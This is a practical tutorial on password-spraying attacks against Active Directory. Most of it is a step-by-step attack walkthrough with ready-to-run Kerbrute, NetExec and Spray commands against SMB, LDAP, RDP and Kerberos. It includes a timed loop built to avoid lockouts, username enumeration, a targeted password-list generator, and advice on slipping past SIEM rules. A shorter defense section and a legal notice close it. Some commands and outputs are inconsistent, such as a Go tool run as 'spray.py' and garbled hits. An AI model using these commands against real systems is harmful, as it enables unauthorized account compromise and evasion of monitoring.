# Password Spraying Attack — A Practical Guide

> **Difficulty:** Intermediate  
> **Environment:** Active Directory (Windows)  
> **Goal:** Understand what password spraying is, how it differs from brute force, and how to execute it step by step against SMB, LDAP, RDP, and Kerberos using real tools.

---

## Table of Contents

1. [What is Password Spraying?](#what-is-password-spraying)
2. [How It Differs from Brute Force](#how-it-differs-from-brute-force)
3. [What Actually Happens During the Attack](#what-actually-happens-during-the-attack)
4. [Before You Spray — Reconnaissance](#before-you-spray--reconnaissance)
5. [Step-by-Step Attack Walkthrough](#step-by-step-attack-walkthrough)
   - [Option A — Kerbrute (Kerberos pre-auth)](#option-a--kerbrute-kerberos-pre-auth)
   - [Option B — NetExec (SMB, LDAP & RDP)](#option-b--netexec-smb-ldap--rdp)
   - [Option C — Spray (Go)](#option-c--spray-go)
6. [Building a Good Password List](#building-a-good-password-list)
7. [Detection & Defense](#detection--defense)
8. [References](#references)

---

## What is Password Spraying?

Password spraying is a **credential attack** that tries a **single password against many accounts** rather than many passwords against a single account.

```
Brute force:   jdoe → password1, password2, password3 ... (triggers lockout fast)
Spraying:      password1 → jdoe, asmith, bwilson, ... (stays under lockout threshold)
```

The goal is to find at least one account using a predictable password — seasonal passwords (`Summer2024!`), company name variations (`Contoso1!`), or default onboarding passwords (`Welcome1`) are common hits.

One valid set of credentials is enough to start enumerating the domain, move laterally, or escalate.

---

## How It Differs from Brute Force

| | Brute Force | Password Spraying |
|---|---|---|
| Attempts per account | Many | One (or very few) |
| Lockout risk | High | Low (by design) |
| Speed | Fast | Slow and deliberate |
| Target | One account | All accounts |
| Detection difficulty | Easy | Harder |

Account lockout policies typically lock an account after 3–5 failed attempts. Spraying respects this — one attempt per account, then wait, then try the next password. Done correctly, no account ever locks out.

---

## What Actually Happens During the Attack

```
[Step 1]  Enumerate valid usernames from AD (LDAP, Kerbrute, OSINT)
[Step 2]  Build a password list based on the target org (season, year, company name)
[Step 3]  Try password #1 against all usernames — wait 30–60 min between rounds
[Step 4]  Try password #2 against all usernames — wait again
[Step 5]  Collect valid credentials → use for further access
```

**Why wait between rounds?**  
Most lockout policies reset the failed attempt counter after an observation window (typically 30 minutes). If you wait longer than this window between sprays, you never accumulate enough failures to trigger a lockout.

```
Lockout policy example:
  Threshold : 5 failed attempts
  Window    : 30 minutes
  Lockout   : 30 minutes

Safe spray cadence:
  Round 1 → wait 31+ minutes → Round 2 → wait 31+ minutes → Round 3 ...
```

---

### What happens at the protocol level

Each protocol handles authentication differently — and the failure behavior is what matters for staying undetected.

#### SMB (port 445)

SMB uses NTLM or Kerberos for authentication. During a spray, the tool opens a TCP connection to port 445 and sends an `SMB_COM_SESSION_SETUP_AND_X` request with the username and an NTLM `AUTHENTICATE_MESSAGE` containing the password hash.

```
Attacker                          Target (port 445)
   |                                    |
   |--- TCP SYN -----------------------|
   |--- SMB NEGOTIATE_PROTOCOL ------->|   "What SMB versions do you support?"
   |<-- SMB NEGOTIATE_RESPONSE --------|
   |--- SESSION_SETUP (user + hash) -->|   This is the spray attempt
   |<-- STATUS_LOGON_FAILURE ----------|   Wrong password → +1 to lockout counter
   |   or                              |
   |<-- STATUS_SUCCESS ----------------|   Valid credentials
```

Every `STATUS_LOGON_FAILURE` increments the failed logon counter for that account on the Domain Controller. The DC tracks this centrally — even if you spray from a different machine each time, the counter still goes up.

**Event generated on the DC:** `4625` (failed logon) with `Logon Type: 3` (network) and `Authentication Package: NTLM`.

---

#### LDAP (port 389 / 636)

LDAP authentication goes through a **bind operation**. The tool sends a `BIND_REQUEST` with the username in DN format and the password in plaintext (or via SASL/NTLM for secure variants).

```
Attacker                          Domain Controller (port 389)
   |                                    |
   |--- TCP connect ------------------>|
   |--- LDAP BIND_REQUEST ------------>|   username: jdoe, password: Summer2024!
   |<-- LDAP BIND_RESPONSE ------------|   resultCode: 49 = invalidCredentials
   |   or                              |
   |<-- LDAP BIND_RESPONSE ------------|   resultCode: 0  = success
   |--- LDAP UNBIND_REQUEST ---------->|
```

`resultCode: 49` means wrong password — and it also increments the AD lockout counter, same as SMB. There is no separate lockout counter per protocol — it all flows into the same AD attribute (`badPwdCount`) on the user object.

**Event generated:** `4625` or `4776` depending on NTLM vs simple bind. Simple LDAP binds over port 389 send the password in cleartext — which means the attacker's password guess travels over the wire unencrypted unless LDAPS (636) or StartTLS is used.

---

#### Kerberos pre-authentication (port 88)

This is the most important one to understand — and why Kerbrute is quieter than SMB/LDAP spray.

When a client wants to authenticate, it sends an `AS-REQ` (Authentication Service Request) to the DC. This request includes a **timestamp encrypted with the user's password hash** — this is called pre-authentication.

```
Attacker                          Domain Controller (port 88)
   |                                    |
   |--- AS-REQ ----------------------->|   Contains: username + encrypted timestamp
   |                                    |   (encrypted with hash of guessed password)
   |<-- KRB5KDC_ERR_PREAUTH_FAILED ----|   Wrong password → error code 0x18
   |   or                              |
   |<-- AS-REP ------------------------|   Correct password → TGT issued
```

The DC tries to decrypt the timestamp using the stored password hash. If decryption fails, it returns `KRB5KDC_ERR_PREAUTH_FAILED` (error `0x18`).

**Key difference from SMB/LDAP:** A failed Kerberos pre-auth attempt generates **Event ID 4771** — not 4625. Many SIEM rules and alerts are written for 4625 only, so Kerberos spray can slip through undetected in poorly tuned environments.

Additionally, Kerberos pre-auth failures **do still increment `badPwdCount`** on the user object — so lockout still applies. The stealthiness comes from the different event ID and the fact that Kerbrute communicates directly over UDP/TCP port 88 without touching SMB shares or LDAP services, generating far less general network noise.

```
Event 4625 = SMB / LDAP / interactive failed logon  (widely alerted on)
Event 4771 = Kerberos pre-auth failure              (often missed)
```

---

#### RDP (port 3389)

RDP authentication goes through the **CredSSP** (Credential Security Support Provider) protocol, which wraps NTLMv2 or Kerberos inside TLS.

```
Attacker                          Target (port 3389)
   |                                    |
   |--- TLS handshake ---------------->|   Encrypted channel established first
   |--- CredSSP NTLM NEGOTIATE ------->|
   |<-- CredSSP NTLM CHALLENGE --------|   Server sends random challenge
   |--- CredSSP NTLM AUTHENTICATE ---->|   Username + NTLMv2 response to challenge
   |<-- DISCONNECT (error) ------------|   Wrong password → connection dropped
   |   or                              |
   |<-- RDP session starts ------------|   Valid credentials → desktop
```

Because TLS wraps everything, you cannot see the credentials on the wire. The server-side event is a standard `4625` with `Logon Type: 10` (RemoteInteractive).

RDP also has **Network Level Authentication (NLA)** — when enabled, credentials are verified *before* the full RDP session starts, which is what allows spraying to work efficiently (fast reject, no full desktop load). Without NLA, you would need to complete the entire RDP handshake before seeing a failure.

**Lockout behavior:** Same AD `badPwdCount` counter — RDP failures count the same as any other failed logon.

---

### The lockout counter — how AD tracks failures

All four protocols above write to the same place: the `badPwdCount` attribute on the user object in AD. This is replicated across all Domain Controllers.

```
User object in AD:
  sAMAccountName : jdoe
  badPwdCount    : 3        ← incremented by every failed attempt, any protocol
  badPasswordTime: <timestamp of last failure>
  lockoutTime    : 0        ← set to non-zero when threshold is hit
```

When `badPwdCount` reaches the lockout threshold, AD sets `lockoutTime` and the account is locked. After the lockout duration passes, `lockoutTime` is reset to 0 and `badPwdCount` is reset to 0 — the window resets.

This is why spraying one attempt per account per round works: `badPwdCount` never reaches the threshold because the observation window resets it before you come back.

---

## Before You Spray — Reconnaissance

You need a valid username list before spraying. Spraying against non-existent accounts wastes time and increases noise.

### Get the lockout policy first

Never spray without knowing the policy. One wrong assumption locks out real users.

```bash
# From Linux with valid creds
nxc smb 192.168.1.10 -u jdoe -p Welcome1! --pass-pol

# From Windows
net accounts /domain
```

Look for:
- **Lockout threshold** — how many failures before lockout
- **Observation window** — how long the counter tracks failures
- **Lockout duration** — how long before auto-unlock

### Enumerate usernames via LDAP

```bash
# With any valid domain account
nxc ldap 192.168.1.10 -u jdoe -p Welcome1! --users | awk '{print $5}' > users.txt
```

### Enumerate usernames via Kerbrute (no creds needed)

Kerbrute uses Kerberos pre-authentication to validate usernames without triggering failed login events — it only checks if the username exists, not the password.

```bash
kerbrute userenum --dc 192.168.1.10 -d corp.local /usr/share/wordlists/usernames.txt
```

Valid usernames go to a results file — use `--output valid_users.txt` to save them.

### Get usernames from OSINT

LinkedIn, company directories, and email formats (`firstname.lastname@corp.com`) are reliable sources. Tools like [linkedin2username](https://github.com/initstring/linkedin2username) can generate AD-style username lists automatically.

---

## Step-by-Step Attack Walkthrough

### Option A — Kerbrute (Kerberos pre-auth)

[Kerbrute](https://github.com/ropnop/kerbrute) by **ropnop** performs spraying directly against the Kerberos service on the Domain Controller. It does not go through SMB or LDAP, making it faster and quieter.

**Install:**

```bash
# Download pre-compiled binary
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64
chmod +x kerbrute_linux_amd64
mv kerbrute_linux_amd64 /usr/local/bin/kerbrute
```

---

**Spray a single password against all users:**

```bash
kerbrute passwordspray -d corp.local --dc 192.168.1.10 users.txt 'Summer2024!'
```

**Breakdown of arguments:**

| Argument | Meaning |
|---|---|
| `passwordspray` | Spray mode — one password, many users |
| `-d corp.local` | Target domain |
| `--dc 192.168.1.10` | Domain Controller IP |
| `users.txt` | File with one username per line |
| `'Summer2024!'` | Password to spray |

**Output on success:**

```
2024/01/15 10:23:41 >  [+] VALID LOGIN:  asmith@corp.local:Summer2024!
2024/01/15 10:23:41 >  [+] VALID LOGIN:  bwilson@corp.local:Summer2024!
```

---

**Save valid credentials to a file:**

```bash
kerbrute passwordspray -d corp.local --dc 192.168.1.10 users.txt 'Summer2024!' --output valid_creds.txt
```

---

**Spray multiple passwords with a delay between rounds:**

Kerbrute does not have a built-in delay — run each password separately with a `sleep` between:

```bash
for password in 'Summer2024!' 'Welcome1!' 'Contoso1!'; do
    echo "[*] Spraying: $password"
    kerbrute passwordspray -d corp.local --dc 192.168.1.10 users.txt "$password" --output "spray_${password}.txt"
    echo "[*] Waiting 35 minutes before next round..."
    sleep 2100
done
```

---

**Why Kerberos spray is quieter:**  
Failed Kerberos pre-authentication generates **Event ID 4771** on the DC — a different event than a standard failed login (4625). Many SIEMs are tuned for 4625 and miss 4771. Additionally, Kerbrute does not create a full logon session, so there is less forensic trace.

---

### Option B — NetExec (SMB, LDAP & RDP)

[NetExec](https://github.com/Pennyw0rth/NetExec) supports password spraying over SMB and LDAP with built-in lockout protection via the `--no-bruteforce` flag.

**Install:**

```bash
pipx install netexec
```

---

**Spray over SMB:**

```bash
nxc smb 192.168.1.10 -u users.txt -p 'Summer2024!' --no-bruteforce --continue-on-success
```

**Breakdown of arguments:**

| Argument | Meaning |
|---|---|
| `-u users.txt` | File containing usernames |
| `-p 'Summer2024!'` | Password to spray |
| `--no-bruteforce` | Try each user only once — prevents lockout |
| `--continue-on-success` | Keep going after a hit (don't stop at first match) |

---

**Spray over LDAP:**

```bash
nxc ldap 192.168.1.10 -u users.txt -p 'Summer2024!' --no-bruteforce --continue-on-success
```

LDAP spray is useful when SMB is firewalled or when targeting non-Windows services that authenticate against AD.

---

**Spray multiple passwords safely:**

```bash
nxc smb 192.168.1.10 -u users.txt -p passwords.txt --no-bruteforce --continue-on-success
```

With `--no-bruteforce`, NetExec pairs each user with each password one-to-one rather than trying all passwords against each user — so `user1:pass1`, `user2:pass2`, etc. This avoids lockout but means your users.txt and passwords.txt must be the same length, or you manage rounds manually.

For a proper round-based spray, run one password at a time:

```bash
nxc smb 192.168.1.10 -u users.txt -p 'Summer2024!' --no-bruteforce --continue-on-success
# wait 35 minutes
nxc smb 192.168.1.10 -u users.txt -p 'Welcome1!' --no-bruteforce --continue-on-success
```

---

**Check results — successful logins:**

```
SMB  192.168.1.10  445  DC01  [+] corp.local\asmith:Summer2024!
SMB  192.168.1.10  445  DC01  [+] corp.local\bwilson:Summer2024! (Pwn3d!)
```

`(Pwn3d!)` means local admin rights on that machine.

---

**Spray against a domain controller directly and dump info on success:**

```bash
nxc ldap 192.168.1.10 -u users.txt -p 'Summer2024!' --no-bruteforce --continue-on-success --kdcHost 192.168.1.10
```

---

**Spray over RDP:**

```bash
nxc rdp 192.168.1.0/24 -u users.txt -p 'Summer2024!' --no-bruteforce --continue-on-success
```

RDP spray is effective against exposed Remote Desktop servers. A `[+]` result means valid credentials — but you need GUI access or an RDP client to actually use them.

```bash
# Connect with a valid hit
xfreerdp /u:asmith /p:'Summer2024!' /v:192.168.1.20
```

> **Note:** RDP has its own lockout behavior independent of the domain policy on some configurations. Test carefully — always check with `--pass-pol` first.

---

### Option C — Spray (Go)

[Spray](https://github.com/Greenwolf/Spray) by **Greenwolf** is a purpose-built password spraying tool written in Go. It has built-in lockout awareness — it tracks attempts per account and automatically enforces a wait between rounds.

**Install:**

```bash
# Install Go first if needed
apt install golang-go

# Clone and build
git clone https://github.com/Greenwolf/Spray
cd Spray
go build spray.go
mv spray /usr/local/bin/spray
```

---

**Spray over SMB — single password:**

```bash
spray.py -smb 192.168.1.10 users.txt passwords.txt 1 35 corp.local
```

**Breakdown of arguments:**

| Argument | Meaning |
|---|---|
| `-smb 192.168.1.10` | Protocol and target DC/host |
| `users.txt` | File with usernames |
| `passwords.txt` | File with passwords (one per line) |
| `1` | Attempts per account per round (keep at 1) |
| `35` | Minutes to wait between rounds |
| `corp.local` | Target domain |

Spray automatically pauses between rounds — no manual `sleep` loops needed.

---

**Spray over LDAP:**

```bash
spray.py -ldap 192.168.1.10 users.txt passwords.txt 1 35 corp.local
```

---

**Spray over RDP:**

```bash
spray.py -rdp 192.168.1.10 users.txt passwords.txt 1 35 corp.local
```

RDP spraying is useful when SMB and LDAP are firewalled but port 3389 is exposed — common on jump boxes and VDI environments.

---

**Single password, manual invocation:**

```bash
echo 'Summer2024!' > pass.txt
spray.py -smb 192.168.1.10 users.txt pass.txt 1 35 corp.local
```

---

**Output on success:**

```
[*] Spraying passwords...
[+] SPRAY HIT! corp.localsmith : Summer2024!
[+] SPRAY HIT! corp.localwilson : Summer2024!
[*] Round complete. Waiting 35 minutes before next round...
```

---

**Why use Spray over a manual loop?**  
Spray tracks per-account attempt counts internally. If you stop and restart mid-campaign, it picks up where it left off. It also logs every attempt with timestamps — useful for reporting.

> **Note:** Spray's RDP module uses `xfreerdp` under the hood. Make sure it is installed: `apt install freerdp2-x11`

---

## Building a Good Password List

Password spraying success depends on predicting what users actually set. Common patterns:

### Seasonal passwords

```
Summer2024!
Winter2024!
Spring2024!
Autumn2024!
Fall2024!
January2024!
```

### Company name variations

```
Contoso1!
Contoso123
Contoso2024!
C0nt0s0!
```

### Default / onboarding passwords

```
Welcome1!
Welcome1
Password1!
P@ssword1
ChangeMe1!
```

### Year + symbol combos

```
2024!
2024@
Password2024!
Admin2024!
```

### Generate a targeted list with a script

```bash
company="Contoso"
year="2024"
seasons=("Spring" "Summer" "Autumn" "Winter")
months=("January" "February" "March" "April" "May" "June" "July" "August" "September" "October" "November" "December")

for s in "${seasons[@]}"; do echo "${s}${year}!"; done
for m in "${months[@]}"; do echo "${m}${year}!"; done
echo "${company}1!"
echo "${company}${year}!"
echo "Welcome1!"
echo "Password1!"
```

---

## Detection & Defense

### For Defenders

**1. Know your lockout policy — and tighten it**  
A threshold of 5 with a 30-minute window is spray-friendly. Lower the threshold to 3 and shorten the window to 10 minutes to increase attacker risk.

**2. Enable Fine-Grained Password Policies (FGPP)**  
Apply stricter policies to privileged accounts without affecting all users.

```powershell
New-ADFineGrainedPasswordPolicy -Name "AdminPolicy" `
    -Precedence 1 `
    -LockoutThreshold 3 `
    -LockoutObservationWindow "0.00:10:00" `
    -LockoutDuration "0.01:00:00" `
    -MinPasswordLength 16 `
    -ComplexityEnabled $true
```

**3. Monitor for distributed low-frequency failures**  
A single source trying one password per account across hundreds of users over 20 minutes is the spray fingerprint. Standard brute-force detection misses this.

- **Event ID 4625** — Failed logon (SMB/interactive)
- **Event ID 4771** — Kerberos pre-authentication failure (Kerbrute)
- **Event ID 4776** — NTLM credential validation failure

Alert on: more than N unique accounts failing from the same source IP within a time window.

**4. Deploy a password spray honeypot**  
Create a fake but plausible-looking account (e.g. `svc_backup`, `helpdesk.admin`) with a common password and no legitimate use. Any successful authentication to it is an immediate alert.

**5. Enforce MFA on all internet-facing services**  
Spraying against OWA, VPN, or RDP becomes useless if MFA is required. Even a compromised password can't be used without the second factor.

**6. Block common passwords at the source**  
Use Azure AD Password Protection or a custom banned password list to block `Summer2024!`, `Welcome1!`, and similar predictable choices at password-set time.

```powershell
# Azure AD Password Protection — on-premises agent
# Syncs Microsoft's banned password list + your custom list to AD
```

**7. Audit accounts with "Password Never Expires"**

```powershell
Get-ADUser -Filter {PasswordNeverExpires -eq $true} -Properties PasswordNeverExpires | Select Name, SamAccountName
```

Accounts with old, non-expiring passwords are the most likely spray victims.

### Detection Summary

| Signal | Event ID | What to look for |
|---|---|---|
| SMB login failure | 4625 | Many unique usernames, same source, same password window |
| Kerberos pre-auth failure | 4771 | Many unique usernames, `0x18` error code |
| NTLM validation failure | 4776 | Same pattern from single source |
| Successful logon after failures | 4624 | After a string of 4625s — spray hit |
| Off-hours logon | 4624 | Valid user logging in at 3 AM from unexpected IP |

---

## References

- [Kerbrute by ropnop](https://github.com/ropnop/kerbrute)
- [NetExec (CrackMapExec fork)](https://github.com/Pennyw0rth/NetExec)
- [NetExec documentation](https://www.netexec.wiki/)
- [Spray by Greenwolf](https://github.com/Greenwolf/Spray)
- [linkedin2username](https://github.com/initstring/linkedin2username)
- [Microsoft — Fine-Grained Password Policies](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/introduction-to-active-directory-administrative-center-enhancements--level-100-#fine_grained_pswd_policy_mgmt)
- [Microsoft — Azure AD Password Protection](https://learn.microsoft.com/en-us/azure/active-directory/authentication/concept-password-ban-bad-on-premises)
- [MITRE ATT&CK T1110.003 — Password Spraying](https://attack.mitre.org/techniques/T1110/003/)

---

> **Legal notice:** This guide is for educational purposes and authorized penetration testing only. Running these attacks against systems you do not own or have explicit written permission to test is illegal.
